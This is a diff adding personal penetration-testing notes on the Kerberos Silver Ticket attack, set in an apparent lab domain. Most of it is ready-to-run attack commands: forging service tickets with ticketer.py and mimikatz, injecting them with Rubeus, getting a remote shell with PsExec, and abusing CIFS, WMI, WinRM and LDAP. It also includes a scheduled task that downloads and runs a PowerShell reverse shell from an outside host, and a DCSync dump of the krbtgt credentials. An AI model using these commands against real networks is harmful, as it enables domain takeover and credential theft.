@@ -1,2 +1,87 @@
 Silver Ticket
-1) 
+1) The Silver Ticket attack is based on crafting a valid TGS for a service after the NTLM hash for a service is owned
+    This way it is possible to gain access to that service by forging a custom TGS as any user.
+    In a Silver Ticket attack we have cracked the NTLM hash of a computer account so we can craft a ticket
+    to get into that machine with administrator priviledges through the SMB service, it is preferable to forge
+    tickets using the AES Kerberos Keys, computer accounts reset their passwords every 30 days.
+    What we can basically do is take control over the services in the victims computer and perform different attacks.
+    -------------------------------
+    Initiating the attack in Linux:
+    - python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
+    - export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
+    - python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
+    while changing of course the properties that are just for reference
+    -------------------------------
+    With windows we can use mimikatz to craft the ticket, inject it with rebeus, and recieve remote shell with psexec
+    Initiating the attack in Windows:
+    # Create the ticket
+    - mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
+    # Inject in memory using mimikatz or Rubeus
+    - mimikatz.exe "kerberos::ptt ticket.kirbi"
+    - .\Rubeus.exe ptt /ticket:ticket.kirbi
+    # Obtain a shell
+    - .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
+    -------------------------------
+    # Example using aes key
+    - kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /target:labwws02.jurassic.park /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi
+    -------------------------------
+    The CIFS service is the service that allow us to access the file system of the victim, we can use the HOST service to create a schtask,
+    then to check if it worked we can use "schtasks /S <hostname>", or we can use the HOST and RPCSS service to execute WMI queries,
+    and we can test it by running "Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>"
+    -------------------------------
+    We can mitigate the attack by checking the EventIDs of 4624 (Account logon), 4634 (Account logoff), 4672 (Admin logon)
+    -------------------------------
+    A table for what services we need to take control of run what:
+    Service Type              Service Silver Tickets
+    WMI                       HOST, RPCSS
+    PowerShell Remoting       HOST, HTTP, Depending on OS also: WSMAN, RPCSS
+    WinRM                     HOST, HTTP, In some occasions you can just ask for: WINRM
+    Scheduled Tasks           HOST
+    Windows File Share,       CIFS
+    also psexec               
+    LDAP operations,          LDAP
+    included DCSync           
+    Windows Remote Server     RPCSS, LDAP, CIFS
+    Administration Tools        
+    Golden Tickets            krbtgt
+
+    With rebeus we can ask for all of the tickets using "/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm"
+    -------------------------------
+    Abusing service tickets examples:
+    For the examples lets imagine we have a ticket that is impersonating the administrator
+    CIFS
+    with CIFS we can access the C$ and ADMIN$ folders with smb and so copy files from a remote system
+    - dir \\vulnerable.computer\C$
+    - dir \\vulnerable.computer\ADMIN$
+    - copy afile.txt \\vulnerable.computer\C$\Windows\Temp
+    we can also get a shell inside the host and execute commnds with psexec
+
+    HOST
+    with this permission we can create scheduled tasks and run commands in remote computers
+    # Check you have permissions to use schtasks over a remote server
+    - schtasks /S some.vuln.pc
+    # Create scheduled task, first for exe execution, second for powershell reverse shell download
+    - schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
+    - schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
+    # Check it was successfully created
+    - schtasks /query /S some.vuln.pc
+    # Run created schtask now
+    - schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
+
+    HOST + RPCSS
+    with these we can execute WMI commands
+    # Check you have enough privileges
+    - Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
+    # Execute code
+    - Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"
+    # You can also use wmic
+    - wmic remote.computer.local list full /format:list
+
+    HOST + WSMAN (WinRM)
+    with winrm we can access a computer and even get powershell
+    - New-PSSession -Name PSC -ComputerName the.computer.name
+    - Enter-PSSession PSC
+
+    LDAP
+    with LDAP we can dump the DC database with DCSync
+    - in mimikatz: "lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt"
